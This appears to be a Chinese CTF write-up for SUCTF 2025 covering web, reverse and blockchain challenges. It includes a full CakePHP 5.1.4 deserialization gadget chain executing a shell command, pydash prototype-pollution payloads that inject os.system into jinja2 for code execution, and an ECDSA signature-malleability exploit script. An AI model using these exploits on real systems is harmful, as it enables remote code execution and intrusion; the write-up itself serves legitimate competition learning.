# SUCTF 2025 writeup by Min-Venom

> 原文: https://www.ctfiot.com/223976.html
> ID: 223976

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

Web: 

SU_POP

cakephp 5.1.4 版本的，参考网上以前版本的链子都不行了，因为加了个 __wakeup() 魔术方法，需要重新找入口，

发现在 srcInternalRejectedPromise 类的 __destruct 存在字符串拼接并且 reason 参数可控，那么可以调用任意 __tostring 魔术方法，

然后全局找 __tostring 魔术方法，发现两处可以调用到 __call() 魔术方法，这里选择 srcAstTypeConstTypeNode 类，变量 $constExpr 可控，

现在需要找到合适的 __call 方法，可以接上老版本的链子， srcORMTable 类的 __call 魔术方法

同理调用到 call() 方法，依然可以实现调用任意类方法，变量控制逻辑和老版本一样，但只能调用无参方法。利用 seay 工具找了一遍，最后发现 srcFrameworkMockObjectGeneratorMockClass类中的 generate 方法

构造exp，可以不用引用接口，题目需要find提权。

<?php  
namespace PHPUnitFrameworkMockObjectGenerator;  
interface MockType{}  
final class MockClass implements MockType{  
    public $mockName;  
    public $classCode;  
    public function  __construct()  
    {  
        $this->mockName = "MockClass";  
        $this->classCode = "system('find /etc/passwd -exec tac /flag.txt ;');";  
    }  
  
}  
  
namespace CakeCore;  
use Countable;  
use IteratorAggregate;  
abstract class ObjectRegistry implements Countable, IteratorAggregate{  
    public $_loaded = [];  
}  
namespace CakeValidation;  
interface ValidatorAwareInterface{}  
namespace CakeEvent;  
interface EventListenerInterface{}  
namespace CakeDatasource;  
interface RepositoryInterface{}  
namespace CakeEvent;  
interface EventDispatcherInterface{}  
namespace CakeORM;  
use CakeCoreObjectRegistry;  
use CakeDatasourceRepositoryInterface;  
use CakeEventEventDispatcherInterface;  
use CakeEventEventListenerInterface;  
use CakeValidationValidatorAwareInterface;  
use PHPUnitFrameworkMockObjectGeneratorMockClass;  
use Traversable;  
class BehaviorRegistry extends ObjectRegistry implements EventDispatcherInterface{  
    public $_methodMap = [];  
    public function count(): int{}  
    public function getIterator(): Traversable{}  
}  
class Table implements RepositoryInterface, EventListenerInterface, EventDispatcherInterface, ValidatorAwareInterface  
{  
    public BehaviorRegistry $_behaviors;  
    public function __construct(){  
        $a=new MockClass();  
        $this->_behaviors = new BehaviorRegistry();  
        $this->_behaviors->_methodMap=["__tostring"=>["MockClass","generate"]];  
        $this->_behaviors->_loaded=["MockClass"=>$a];  
    }  
  
}  
namespace ReactPromise;  
interface PromiseInterface{}  
  
namespace ReactPromiseInternal;  
use ReactPromisePromiseInterface;  
  
final class RejectedPromise implements PromiseInterface{  
    public $reason;  
}  
namespace PHPStanPhpDocParserAst;  
interface Node{};  
  
namespace PHPStanPhpDocParserAstType;  
use PHPStanPhpDocParserAstNode;  
interface TypeNode extends Node  
{  
}  
  
namespace PHPStanPhpDocParserAstType;  
use CakeORMTable;  
use ReactPromiseInternalRejectedPromise;  
  
class ConstTypeNode implements TypeNode{  
    public $constExpr;  
}  
  
  
$pop = new RejectedPromise();  
$pop->reason=new ConstTypeNode();  
$pop->reason->constExpr=new Table();  
echo base64_encode(serialize($pop));

 SU_blog 

登陆后发现有file参数，可以实现目录穿越读取任意文件，绕过一下../，获得源码

然后继续读取waf.py，利用../绕过关键字。在源码看到存在pydash原型链污染，搜索一下发现可以利用 jinja2 编译模板时的包 rce，网上payload

{"name":"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0","value":"*;import os;os.system('id')"}

这里有 waf 需要绕一下，数字索引还有 2 可以利用，然后通过写文件获得回显，构造

{"key": ".__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]","value": "*;import os;os.system('/read* >/tmp/gaoren.txt')"}

最后成功命令执行，这里编译包是只有第一次渲染时才会调用的，所以选择 2 分钟的容器并且多访问几个页面。最后获得flag

 Reverse: 

SU_BBRE

从给到的txt文本中不难分析出分别有两段加密逻辑，func2对应的是无魔改RC4，密钥是“suctf”

第二段直接定位到func1中，不难看出有个下标相加的操作

data=[0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28]
for i in range(len(data)):
    print(chr(data[i]+i),end='')
#AndPWNT00

然而将两端flag拼接起来之后还是不太对，flag给的大概意思，本题有pwn的知识点，还有就是程序控制流是怎么到的function1，那么即是从输入的时候有个栈溢出的操作从而劫持了控制流到func1，故而两段flag之间还应该添加func1目标函数的地址才是最后的flag，注意端序问题，调换以下顺序

拼接起来即可：
SUCTF{We1com3ToReWorld="@AndPWNT00}

 Misc: 

Onchain Magician

源码：

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

contract MagicBox {
 struct Signature {
 uint8 v;
 bytes32 r;
 bytes32 s;
 }

 address magician;
 bytes32 alreadyUsedSignatureHash;
 bool isOpened;

 constructor() {}

 function isSolved() public view returns (bool) {
 return isOpened;
 }

 function getMessageHash(address _magician) public view returns (bytes32) {
 return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(this), block.chainid));
 }

 function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) {
 address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);
 bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));
 return (signer, signatureHash);
 }

 function signIn(Signature memory signature) external {
 require(magician == address(0), "Magician already signed in");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 magician = signer;
 alreadyUsedSignatureHash = signatureHash;
 }

 function openBox(Signature memory signature) external {
 require(magician == msg.sender, "Only magician can open the box");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 require(signatureHash != alreadyUsedSignatureHash, "Signature already used");
 isOpened = true;
 }
}

分析：和其他的合约 ctf 一样，调用 openBox函数成功使得 isOpened为 ture 即可拿到 flag。
大致一看，这道题需要我们签署原始交易，获得 v, r, s 的值。
•getMessageHash：该函数用于构造合约预期的 message 摘要
•_getSignerAndSignatureHash：内部函数，用于还原签名的签署者，以及获得签名的哈希
•signIn：传递签名（这里要求我们 msg.sender 和还原出来的签名地址相同，同时在此之前没有调用过该函数），设置 magician = signer
•openBox：传递签名，想要调用成功，需要与上一次调用signIn的 signer 相同，同时签名的哈希不同。
大致分析后，我们可以知道：每个人（signer）的交易哈希都只有一个，但是我们需要有两个不同的有效签名。这个实际上是以太坊的签名拓展性攻击漏洞。
简单来说：由于以太坊底层使用的是 Secp256K1 椭圆曲线，该椭圆曲线，对于一个签名，有两个有效的 s 值。所以，通过构造，我们得到另一个有效的 s 值，将这个 s 值作为调用openBox中传递即可。
完整 Poc：

import {Script, console2} from "forge-std/Script.sol";
import {MagicBox} from "../src/MagicBox.sol";

contract Attack is Script {
 function run() external {
 MagicBox target = MagicBox(vm.envAddress("target"));
 // secp256k1 曲线的阶 n
 uint256 n = uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);

 vm.startBroadcast();
 bytes32 MessageHash = target.getMessageHash(vm.envAddress("account"));
 vm.stopBroadcast();

 (uint8 v, bytes32 r, bytes32 s) = vm.sign(vm.envUint("key"), MessageHash);
 v = 28;
 MagicBox.Signature memory signature1 = MagicBox.Signature(v, r, s);

 MagicBox.Signature memory signature2 = MagicBox.Signature(27, r, bytes32(n - uint256(s)));

 vm.startBroadcast();
 target.signIn(signature1);
 target.openBox(signature2);
 vm.stopBroadcast();
 }
}

flag：SUCTF{C0n9r4ts!Y0u're_An_0ut5taNd1ng_OnchA1n_Ma9ic1an.}

real_checkin

一开始尝试用emoji解码无果

观察了一下几个表情的英文翻译之后，知道直接取每一个表情的英文开头第一个字符即是flag

🐍☂️🐈🌮🍟分别对应以下：
snake
umbrellla
cat
taco
fries
取第一个字符得到suctf，依次类推得到：
suctf{welcome_to_suctf_you_can_really_dance}

Onchain Checkin

下载附件后打开源码，是个很简单的 Solana 程序。flag 在 Solana explorer 上都能查到。

这里是 program 的地址。explorer 上查询到如下数据：

这两个有一个是测试数据：

另一个是对的

但是这里只有两个

另一个看源码这里：

这里提到了 account3 的公钥。试了下 base58 也能解出来：

拼一下：

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
<?php  
namespace PHPUnitFrameworkMockObjectGenerator;  
interface MockType{}  
final class MockClass implements MockType{  
    public $mockName;  
    public $classCode;  
    public function  __construct()  
    {  
        $this->mockName = "MockClass";  
        $this->classCode = "system('find /etc/passwd -exec tac /flag.txt ;');";  
    }  
  
}  
  
namespace CakeCore;  
use Countable;  
use IteratorAggregate;  
abstract class ObjectRegistry implements Countable, IteratorAggregate{  
    public $_loaded = [];  
}  
namespace CakeValidation;  
interface ValidatorAwareInterface{}  
namespace CakeEvent;  
interface EventListenerInterface{}  
namespace CakeDatasource;  
interface RepositoryInterface{}  
namespace CakeEvent;  
interface EventDispatcherInterface{}  
namespace CakeORM;  
use CakeCoreObjectRegistry;  
use CakeDatasourceRepositoryInterface;  
use CakeEventEventDispatcherInterface;  
use CakeEventEventListenerInterface;  
use CakeValidationValidatorAwareInterface;  
use PHPUnitFrameworkMockObjectGeneratorMockClass;  
use Traversable;  
class BehaviorRegistry extends ObjectRegistry implements EventDispatcherInterface{  
    public $_methodMap = [];  
    public function count(): int{}  
    public function getIterator(): Traversable{}  
}  
class Table implements RepositoryInterface, EventListenerInterface, EventDispatcherInterface, ValidatorAwareInterface  
{  
    public BehaviorRegistry $_behaviors;  
    public function __construct(){  
        $a=new MockClass();  
        $this->_behaviors = new BehaviorRegistry();  
        $this->_behaviors->_methodMap=["__tostring"=>["MockClass","generate"]];  
        $this->_behaviors->_loaded=["MockClass"=>$a];  
    }  
  
}  
namespace ReactPromise;  
interface PromiseInterface{}  
  
namespace ReactPromiseInternal;  
use ReactPromisePromiseInterface;  
  
final class RejectedPromise implements PromiseInterface{  
    public $reason;  
}  
namespace PHPStanPhpDocParserAst;  
interface Node{};  
  
namespace PHPStanPhpDocParserAstType;  
use PHPStanPhpDocParserAstNode;  
interface TypeNode extends Node  
{  
}  
  
namespace PHPStanPhpDocParserAstType;  
use CakeORMTable;  
use ReactPromiseInternalRejectedPromise;  
  
class ConstTypeNode implements TypeNode{  
    public $constExpr;  
}  
  
  
$pop = new RejectedPromise();  
$pop->reason=new ConstTypeNode();  
$pop->reason->constExpr=new Table();  
echo base64_encode(serialize($pop));
```



```
{"name":"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0","value":"*;import os;os.system('id')"}
```



```
{"key": ".__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]","value": "*;import os;os.system('/read* >/tmp/gaoren.txt')"}
```



```
data=[0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28]
for i in range(len(data)):
    print(chr(data[i]+i),end='')
#AndPWNT00
```



```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

contract MagicBox {
 struct Signature {
 uint8 v;
 bytes32 r;
 bytes32 s;
 }

 address magician;
 bytes32 alreadyUsedSignatureHash;
 bool isOpened;

 constructor() {}

 function isSolved() public view returns (bool) {
 return isOpened;
 }

 function getMessageHash(address _magician) public view returns (bytes32) {
 return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(this), block.chainid));
 }

 function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) {
 address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);
 bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));
 return (signer, signatureHash);
 }

 function signIn(Signature memory signature) external {
 require(magician == address(0), "Magician already signed in");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 magician = signer;
 alreadyUsedSignatureHash = signatureHash;
 }

 function openBox(Signature memory signature) external {
 require(magician == msg.sender, "Only magician can open the box");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 require(signatureHash != alreadyUsedSignatureHash, "Signature already used");
 isOpened = true;
 }
}
```



```
import {Script, console2} from "forge-std/Script.sol";
import {MagicBox} from "../src/MagicBox.sol";

contract Attack is Script {
 function run() external {
 MagicBox target = MagicBox(vm.envAddress("target"));
 // secp256k1 曲线的阶 n
 uint256 n = uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);

 vm.startBroadcast();
 bytes32 MessageHash = target.getMessageHash(vm.envAddress("account"));
 vm.stopBroadcast();

 (uint8 v, bytes32 r, bytes32 s) = vm.sign(vm.envUint("key"), MessageHash);
 v = 28;
 MagicBox.Signature memory signature1 = MagicBox.Signature(v, r, s);

 MagicBox.Signature memory signature2 = MagicBox.Signature(27, r, bytes32(n - uint256(s)));

 vm.startBroadcast();
 target.signIn(signature1);
 target.openBox(signature2);
 vm.stopBroadcast();
 }
}
```



```
🐍☂️🐈🌮🍟分别对应以下：
snake
umbrellla
cat
taco
fries
取第一个字符得到suctf，依次类推得到：
suctf{welcome_to_suctf_you_can_really_dance}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/9-1736815410.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/7-1736815411.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/10-1736815411.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/3-1736815411.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1736815412.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/1-1736815412.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/1-1736815412.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/6-1736815413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/1-1736815413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/8-1736815413.png)